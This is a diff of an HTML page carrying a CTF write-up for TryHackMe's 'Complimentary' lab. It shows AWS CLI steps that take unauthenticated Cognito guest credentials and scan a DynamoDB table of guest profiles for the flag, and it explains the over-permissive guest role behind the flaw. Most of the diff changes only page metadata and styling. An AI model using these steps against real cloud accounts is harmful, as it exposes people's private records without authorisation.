@@ -4,24 +4,25 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Complimentary · hackerholidays</title>
-<meta name="description" content="CTF writeup: Complimentary (hackerholidays)" />
+<meta name="description" content="Welcome to Day 3 of the TryHackMe Hacker Holidays 2026 writeups." />
 <meta name="theme-color" content="#16161e" />
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; frame-ancestors 'self'" />
 <link rel="canonical" href="https://aaadarsh1337.github.io/writeups/hackerholidays/complimentary/" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Complimentary · hackerholidays" />
-<meta property="og:description" content="CTF writeup: Complimentary (hackerholidays)" />
+<meta property="og:description" content="Welcome to Day 3 of the TryHackMe Hacker Holidays 2026 writeups." />
 <meta property="og:url" content="https://aaadarsh1337.github.io/writeups/hackerholidays/complimentary/" />
-<meta property="og:image" content="https://aaadarsh1337.github.io/assets/avatar.jpg" />
-<meta name="twitter:card" content="summary" />
+<meta property="og:image" content="https://aaadarsh1337.github.io/writeups/hackerholidays/complimentary/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:title" content="Complimentary · hackerholidays" />
-<meta name="twitter:description" content="CTF writeup: Complimentary (hackerholidays)" />
-<meta name="twitter:image" content="https://aaadarsh1337.github.io/assets/avatar.jpg" />
-<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Complimentary · hackerholidays", "description": "CTF writeup: Complimentary (hackerholidays)", "url": "https://aaadarsh1337.github.io/writeups/hackerholidays/complimentary/", "author": {"@type": "Person", "name": "Adarsh Pillai", "url": "https://aaadarsh1337.github.io/"}}</script>
+<meta name="twitter:description" content="Welcome to Day 3 of the TryHackMe Hacker Holidays 2026 writeups." />
+<meta name="twitter:image" content="https://aaadarsh1337.github.io/writeups/hackerholidays/complimentary/og.png" />
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Complimentary · hackerholidays", "description": "Welcome to Day 3 of the TryHackMe Hacker Holidays 2026 writeups.", "url": "https://aaadarsh1337.github.io/writeups/hackerholidays/complimentary/", "author": {"@type": "Person", "name": "Adarsh Pillai", "url": "https://aaadarsh1337.github.io/"}}</script>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%2316161e'/%3E%3Crect x='13' y='4' width='6' height='24' fill='%237DCFFF'/%3E%3Crect x='4' y='13' width='24' height='6' fill='%237DCFFF'/%3E%3Crect x='14' y='6' width='4' height='20' fill='%2316161e'/%3E%3Crect x='6' y='14' width='20' height='4' fill='%2316161e'/%3E%3C/svg%3E" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../../css/tokens.css" />
 <link rel="stylesheet" href="../../css/style.css" />
 <link rel="stylesheet" href="../../css/pygments.css" />
 </head>
@@ -71,6 +72,7 @@
         <span class="tb-label">READING</span>
         <span>notes.md</span>
       </div>
+      <button type="button" class="btn btn--ghost btn--small" id="copyLinkBtn">Copy link</button>
       <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/complimentary/notes.md" target="_blank" rel="noopener noreferrer">Source &#8599;</a>
     </div>
     <div class="reader__body">
@@ -87,30 +89,30 @@
 </blockquote>
 <p>The instructions indicate that the application is using AWS in the <code>us-east-1</code> region.</p>
 <p>We can request an identity from the Cognito Identity Pool:</p>
-<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-id<span class="w"> </span><span class="se">\</span>
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-id<span class="w"> </span><span class="se">\</span>
 --identity-pool-id<span class="w"> </span><span class="s2">&quot;us-east-1:836c0949-292d-485b-b532-52d5ca7bb688&quot;</span><span class="w"> </span><span class="se">\</span>
 --region<span class="w"> </span><span class="s2">&quot;us-east-1&quot;</span>
 </code></pre></div>
 
 <p>The command returns an <code>IdentityId</code>:</p>
-<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<div class="highlight is-code lang-json" data-lang="json"><pre><span></span><code><span class="p">{</span>
 <span class="w">    </span><span class="nt">&quot;IdentityId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
 <p>Next, request temporary AWS credentials for this identity:</p>
-<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-credentials-for-identity<span class="w"> </span><span class="se">\</span>
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-credentials-for-identity<span class="w"> </span><span class="se">\</span>
 --identity-id<span class="w"> </span><span class="s2">&quot;us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8&quot;</span><span class="w"> </span><span class="se">\</span>
 --region<span class="w"> </span><span class="s2">&quot;us-east-1&quot;</span>
 </code></pre></div>
 
 <p>The response contains an <code>AccessKeyId</code>, <code>SecretKey</code>, and <code>SessionToken</code>. These are temporary credentials, so they should be used immediately and should not be published in a writeup.</p>
 <p>Configure the AWS CLI using the values returned by the command:</p>
-<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>configure
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>aws<span class="w"> </span>configure
 </code></pre></div>
 
 <p>Enter the temporary access key and secret key when prompted. The session token can be set separately:</p>
-<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">&quot;YOUR_SESSION_TOKEN&quot;</span>
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">&quot;YOUR_SESSION_TOKEN&quot;</span>
 </code></pre></div>
 
 <p>The table name can be found in the application:</p>
@@ -118,14 +120,14 @@
 <p><code>complimentary-GuestWellnessProfiles</code></p>
 </blockquote>
 <p>Now scan the DynamoDB table:</p>
-<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>dynamodb<span class="w"> </span>scan<span class="w"> </span><span class="se">\</span>
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>aws<span class="w"> </span>dynamodb<span class="w"> </span>scan<span class="w"> </span><span class="se">\</span>
 --table-name<span class="w"> </span><span class="s2">&quot;complimentary-GuestWellnessProfiles&quot;</span><span class="w"> </span><span class="se">\</span>
 --region<span class="w"> </span><span class="s2">&quot;us-east-1&quot;</span><span class="w"> </span><span class="se">\</span>
 &gt;<span class="w"> </span>final.json
 </code></pre></div>
 
 <p>The scan returns the guest profiles stored in the table. Searching the output for <code>THM{</code> reveals the flag:</p>
-<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-o<span class="w"> </span><span class="s1">&#39;THM{[^}]*}&#39;</span><span class="w"> </span>final.json
+<div class="highlight is-terminal lang-bash" data-lang="bash"><pre><span></span><code>grep<span class="w"> </span>-o<span class="w"> </span><span class="s1">&#39;THM{[^}]*}&#39;</span><span class="w"> </span>final.json
 </code></pre></div>
 
 <p>The vulnerability exists because the unauthenticated guest role is allowed to perform a full DynamoDB <code>Scan</code>, even though the application is only supposed to retrieve an individual guest profile.</p>
